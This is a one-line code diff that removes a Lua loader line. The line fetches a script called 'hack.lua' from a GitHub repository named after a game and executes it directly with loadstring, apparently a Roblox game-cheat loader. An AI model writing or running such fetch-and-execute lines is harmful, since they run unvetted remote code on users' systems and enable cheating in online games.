@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/piglex9/marble-rider-star-quest/main/hack.lua", true))()
